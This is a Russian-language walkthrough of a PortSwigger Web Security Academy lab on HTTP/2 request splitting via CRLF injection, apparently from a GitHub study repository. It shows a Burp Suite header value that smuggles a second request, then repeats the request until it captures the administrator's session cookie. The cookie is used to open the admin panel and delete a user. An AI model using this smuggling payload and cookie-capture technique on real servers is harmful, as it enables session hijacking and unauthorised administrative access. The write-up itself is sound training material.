Перейдем на уязвимый ресурс 

Откроем `Proxy` ->` HTTP history` и изучим запросы

отправим в `Repeater` запрос на корневую страницу

Далее зайдем в `Inspector` -> `Request header` и добавим header 
```
Foo со значением

Bar


GET /qweqwbfqwyfqwfqwfqw HTTP/1.1
Host: 0a43007604564f3781ea48f6002d00bd.web-security-academy.net
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/14.%20HTTP2%20request%20splitting%20via%20CRLF%20injection/pics%20for%20walkthrough/1.png)
Отлично, при сохранении наш запрос изменится и видим 200 респонс статус код

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/14.%20HTTP2%20request%20splitting%20via%20CRLF%20injection/pics%20for%20walkthrough/2.png)


Повторяем этот запрос, пока не увидим 
```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=4jUo7jEXjkj6Mv7GQ9BdcpdpRowv7AXR; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/14.%20HTTP2%20request%20splitting%20via%20CRLF%20injection/pics%20for%20walkthrough/3.png)


изменим куки и попадем на админскую панель, и удалим carlos'a как этого и требует задание
после чего получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/14.%20HTTP2%20request%20splitting%20via%20CRLF%20injection/pics%20for%20walkthrough/4.png)
